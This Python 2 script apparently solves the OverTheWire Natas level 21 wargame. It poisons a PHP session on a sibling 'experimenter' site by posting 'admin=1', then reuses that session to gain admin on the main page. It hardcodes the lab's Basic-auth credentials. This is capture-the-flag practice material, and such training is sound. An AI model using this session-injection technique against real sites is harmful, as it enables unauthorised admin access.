#!/usr/bin/python
import urllib
import urllib2
import cookielib


# 
def request_generate(URL, cookie='', data={}):
    req = urllib2.Request(URL, data=urllib.urlencode(data))
    req.add_header('User-Agent',  'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0')
    req.add_header('Authorization', 'Basic bmF0YXMyMTpJRmVrUHlyUVhmdHppREVzVXIzeDIxc1l1YWh5cGRnSg==')
    req.add_header('Cookie', '__cfduid=d343ee483747c1158b3dd095b778a57ff1549137174;'+cookie)
    return urllib2.urlopen(req)


URL1 = 'http://natas21.natas.labs.overthewire.org/index.php' # main page
URL2 = 'http://natas21-experimenter.natas.labs.overthewire.org/index.php' # sibling page to set session id

#def main():
#    phpsessid = 
#    r = request_generate(URL2, data={"align" :"center", "fontsize" : "100%", "bgcolor" : "yellow", "admin":"1"})
#
#    #phpsessid = 
#    return


phpsessid = request_generate(URL2).headers.dict['set-cookie'].split(';')[0]
request_generate(URL2, data={ "align" : "center", "submit":"Update", "fontsize" : "100%",  "bgcolor" : "yellow", "admin":"1"}, cookie=phpsessid)
print request_generate(URL2+'?debug=true', cookie=phpsessid).read()

print "+"*50
print request_generate(URL1, cookie=phpsessid).read()


